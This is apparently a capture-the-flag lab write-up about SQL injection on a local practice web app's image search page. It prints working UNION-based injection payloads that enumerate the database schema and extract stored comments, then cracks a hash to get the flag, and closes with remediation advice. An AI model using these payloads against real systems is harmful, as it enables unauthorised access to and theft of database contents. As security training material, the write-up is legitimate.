# situation

## http://192.168.56.101/?page=searchimg

search interpet sql like in usr sql injection 

we use same technique we find this 

we use this to show all tables
0 UNION  select table_name, column_name FROM information_schema.columns  


we ask for 2 paramets in sql select (url , comment ) otherwise the sql request returns nothing.


ID: 0 UNION select url, comment FROM list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : borntosec.ddns.net/images.png

md5 decrypte : 1928e8083cf461a51303633093573c46 : albatroz
sha256 encrypt : Sha256(albatroz) = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
so we find this flag : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188


# problem

All sensitive information stored in the database is accessible to anyone.


# solution

Use an ORM (Object-Relational Mapping) library: An ORM can help to abstract away the SQL and provide a safe and secure way to interact with the database.

Validate and sanitize user input: By validating and sanitizing user input, you can prevent malicious code from being included in SQL statements.

Use a whitelist approach: Only allow specific, known good inputs and prevent all other inputs.

In SQL, we can specify and limit access to certain tables based on the IP that makes the request. This prevents if a vulnerability is discovered by hacker, the entire database from being usable.